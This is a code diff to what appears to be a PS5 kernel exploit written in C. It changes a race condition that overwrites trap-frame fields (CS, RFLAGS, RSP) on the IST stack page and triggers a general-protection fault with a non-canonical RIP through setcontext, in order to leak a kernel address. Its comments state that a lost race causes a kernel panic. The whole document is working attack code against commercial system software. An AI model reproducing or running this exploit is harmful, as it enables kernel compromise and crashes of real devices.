@@ -2898,26 +2898,33 @@ gp_trap_fault_handler(int sig, siginfo_t *info, void *ctx)
     siglongjmp(gp_trap_jmp_env, 1);
 }
 
-/* Writer thread: continuously overwrites CS field on IST page */
+/*
+ * Writer thread: continuously overwrites trap frame fields on IST page.
+ *
+ * Per sleirsgoevy: write {CS=0x43, RFLAGS=0x202, low32(RSP)=0} to
+ * IST_top - 32.  This makes the kernel think the #GP was from user
+ * mode (CS=0x43) so it delivers a signal instead of panicking.
+ *
+ * IST stack trap frame layout (top at page+0x1000):
+ *   page+0xFF8: SS        (IST top - 0x08)
+ *   page+0xFF0: RSP       (IST top - 0x10)  <- writer clears low 32 bits
+ *   page+0xFE8: RFLAGS    (IST top - 0x18)  <- writer sets 0x202
+ *   page+0xFE0: CS        (IST top - 0x20)  <- writer sets 0x43
+ *   page+0xFD8: RIP       (IST top - 0x28)  <- doreti_iret (untouched)
+ *   page+0xFD0: Error code(IST top - 0x30)
+ */
 static int
 gp_trap_writer_fn(void *arg)
 {
     volatile uint8_t *ist_page = (volatile uint8_t *)arg;
-    /*
-     * IST stack trap frame layout (top at page+0x1000):
-     *   page+0xFF8: SS        (IST top - 0x08)
-     *   page+0xFF0: RSP       (IST top - 0x10)
-     *   page+0xFE8: RFLAGS    (IST top - 0x18)  <- writer sets 0x202
-     *   page+0xFE0: CS        (IST top - 0x20)   <- writer sets 0x43
-     *   page+0xFD8: RIP       (IST top - 0x28)   <- doreti_iret address
-     *   page+0xFD0: Error code(IST top - 0x30)
-     */
-    volatile uint64_t *p_cs     = (volatile uint64_t *)(ist_page + 0xFE0);
-    volatile uint64_t *p_rflags = (volatile uint64_t *)(ist_page + 0xFE8);
+    volatile uint64_t  *p_cs      = (volatile uint64_t  *)(ist_page + 0xFE0);
+    volatile uint64_t  *p_rflags  = (volatile uint64_t  *)(ist_page + 0xFE8);
+    volatile uint32_t  *p_rsp_lo  = (volatile uint32_t  *)(ist_page + 0xFF0);
 
     while (!gp_trap_stop_writer) {
         *p_cs     = 0x43;   /* user-mode CS selector */
         *p_rflags = 0x202;  /* IF set, reserved bit 1 set */
+        *p_rsp_lo = 0;      /* zero low 32 bits of RSP */
     }
     return 0;
 }
@@ -4773,18 +4780,23 @@ broad_done:
 
         /* Phase 3: Trigger loop
          *
-         * sigsetjmp is inside the while loop so we can retry after
-         * each signal.  We check both the signal handler's mc_rip
-         * (which sleirsgoevy's technique needs the CS race for) and
-         * the IST page RIP field (direct read, race-independent).
+         * Per sleirsgoevy: set non-canonical mc_rip (NOT mc_rsp).
+         * PS5 kernel validates RSP in sigreturn but not RIP, so
+         * only RIP actually reaches iretq and triggers #GP.
          *
-         * Strategies:
-         *   attempts  1-25: non-canonical RSP (triggers #SS on AMD)
-         *   attempts 26-50: non-canonical RIP (triggers #GP)
+         * The writer thread races CS from kernel→0x43 in the IST
+         * trap frame.  If race wins: kernel thinks user-mode fault,
+         * delivers SIGBUS with mc_rip = doreti_iret.
+         * If race loses: kernel sees kernel-mode #GP → panic.
+         *
+         * sigsetjmp is inside the loop so we can retry after each
+         * signal.  We check both signal mc_rip and IST page RIP.
          */
-        send_response(sock, "\n  Starting trigger loop (50 attempts)...\n");
+        send_response(sock, "\n  WARNING: each attempt with non-canonical RIP risks\n"
+                      "  kernel panic if the CS race loses.\n");
+        send_response(sock, "\n  Starting trigger loop (10 attempts)...\n");
         {
-            int max_attempts = 50;
+            int max_attempts = 10;
             gp_trap_attempt_count = 0;
             gp_trap_got_result = 0;
             gp_trap_doreti_addr = 0;
@@ -4846,7 +4858,10 @@ broad_done:
                         break;
                     }
 
-                    /* Neither source had kernel address; retry */
+                    /* Neither source had kernel address; retry.
+                     * Reset got_result (signal handler sets it
+                     * unconditionally) so while-loop continues. */
+                    gp_trap_got_result = 0;
                     continue;
                 }
 
@@ -4863,38 +4878,28 @@ broad_done:
                     if (gp_trap_attempt_count > max_attempts)
                         break;
 
-                    /* Choose strategy based on attempt number */
-                    const char *strategy;
-                    if (gp_trap_attempt_count <= 25) {
-                        /* Non-canonical RSP → #SS on AMD, #GP on Intel */
-                        if (gp_trap_uc_rsp_off >= 0) {
-                            *(uint64_t *)(uc_buf + gp_trap_uc_rsp_off) =
-                                0x8000000000000000ULL;
-                        } else {
-                            ucontext_t *uc = (ucontext_t *)uc_buf;
-                            uc->uc_mcontext.mc_rsp =
-                                0x8000000000000000ULL;
-                        }
-                        strategy = "non-canonical RSP";
+                    /*
+                     * Set non-canonical RIP (not RSP!).
+                     * Per sleirsgoevy: non-canonical mc_rip causes
+                     * #GP on iretq.  PS5 kernel validates RSP in
+                     * sigreturn but not RIP, so only RIP reaches
+                     * the actual iretq instruction.
+                     *
+                     * WARNING: if the writer thread CS race loses,
+                     * the kernel sees a kernel-mode #GP and panics.
+                     */
+                    if (gp_trap_uc_rip_off >= 0) {
+                        *(uint64_t *)(uc_buf + gp_trap_uc_rip_off) =
+                            0x8000000000000000ULL;
                     } else {
-                        /* Non-canonical RIP → #GP */
-                        if (gp_trap_uc_rip_off >= 0) {
-                            *(uint64_t *)(uc_buf + gp_trap_uc_rip_off) =
-                                0x8000000000000000ULL;
-                        } else {
-                            ucontext_t *uc = (ucontext_t *)uc_buf;
-                            uc->uc_mcontext.mc_rip =
-                                0x8000000000000000ULL;
-                        }
-                        strategy = "non-canonical RIP";
+                        ucontext_t *uc = (ucontext_t *)uc_buf;
+                        uc->uc_mcontext.mc_rip =
+                            0x8000000000000000ULL;
                     }
 
-                    if (gp_trap_attempt_count <= 5 ||
-                        gp_trap_attempt_count % 10 == 0) {
-                        send_response(sock,
-                            "  attempt %d (%s)...\n",
-                            (int)gp_trap_attempt_count, strategy);
-                    }
+                    send_response(sock,
+                        "  attempt %d (non-canonical RIP)...\n",
+                        (int)gp_trap_attempt_count);
 
                     setcontext((ucontext_t *)uc_buf);
 
